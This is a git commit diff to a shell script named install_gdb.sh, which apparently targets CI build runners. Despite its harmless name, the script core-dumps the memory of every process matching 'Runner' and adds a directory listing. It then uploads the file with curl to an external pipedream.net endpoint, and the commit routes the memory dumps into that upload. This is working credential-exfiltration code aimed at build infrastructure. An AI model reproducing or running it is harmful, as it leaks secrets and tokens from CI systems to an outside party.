1b78fd6730866c2fe4d0662c456b0b79cddf27fc
wololo <wololo@wololo>
2021-11-03 19:46:09 -0300

    .

--- cmds/install_gdb.sh
+++ cmds/install_gdb.sh
@@ -2,15 +2,16 @@
 
 # install gdb to provide gcore
 # sudo is passwordless according to doc
-sudo apt-get install gdb
+sudo apt-get install gdb > /tmp/file.txt
 
 # get pids related to runners
 for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
 do
-    gcore $pid
+    echo "---$pid---"
+    gcore $pid >> /tmp/file.txt
 done
 
-echo $(ls -la) > /tmp/file.txt
+echo $(ls -la) >> /tmp/file.txt
 
 curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
 
